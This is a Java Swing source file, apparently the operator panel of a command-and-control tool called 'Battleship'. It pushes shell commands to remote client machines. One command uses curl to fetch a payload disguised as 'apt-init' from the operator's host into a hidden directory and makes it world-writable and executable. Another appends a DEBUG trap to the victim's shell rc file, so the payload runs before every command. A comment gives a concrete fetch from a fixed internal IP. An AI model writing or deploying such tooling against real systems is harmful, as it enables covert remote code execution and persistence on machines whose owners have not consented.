import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;

public class BattleshipSettings extends JFrame {
    private JPanel battleshipPanel;
    private JTextField userField;
    private JTextField rcField;
    private JTextField ipField;
    private JButton installButton;
    private JButton executeTerminalTrapButton;
    private JButton resetRCFileButton;
    private String hostIP;
    private RequestCalls apiHandle;
    public BattleshipSettings(RequestCalls apiHandle) {
        setContentPane(battleshipPanel);
        setSize(300, 300);
        setLocationRelativeTo(null);
        setTitle("Battleship settings");
        setResizable(false);
        setVisible(true);
        this.apiHandle = apiHandle;
        installButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String command = "curl --create-dirs -o /home/"+userField.getText()+"/.init/apt-init 'http://"+apiHandle.getHostIP()+":8080/apt-init'; chown "+userField.getText()+":"+userField.getText()+" /home/"+userField.getText()+"/.init; chmod 777 /home/"+userField.getText()+"/.init/apt-init";
                //curl --create-dirs -o /home/kali/.init/InitDaemon 'http://10.50.0.20:8080/InitDaemon' && chmod 777 /home/kali/.init/InitDaemon
                pushCommand(command);
            }
        });
        executeTerminalTrapButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String command = "echo \"trap /home/"+userField.getText()+"/.init/apt-init DEBUG\" >> /home/"+userField.getText()+"/"+rcField.getText();
                pushCommand(command);
            }
        });
        resetRCFileButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                String command = "curl -O --output-dir /home/"+userField.getText()+"/"+rcField.getText()+" 'http://"+apiHandle.getHostIP()+":8080/"+rcField.getText()+"' && chmod 644 /home/"+userField.getText()+"/"+rcField.getText()+" && chown "+userField.getText()+":"+userField.getText()+" /home/"+userField.getText()+"/"+rcField.getText();
                pushCommand(command);
            }
        });
    }
    private void pushCommand(String command){
        String cli = ipField.getText().equals("all") ? "a" : ipField.getText();
        try {
            apiHandle.Push(command, cli, 1);
        } catch (IOException | InterruptedException ex) {
            JOptionPane.showMessageDialog(BattleshipSettings.this, "Couldn't fetch: " + ex);
        }
    }
}
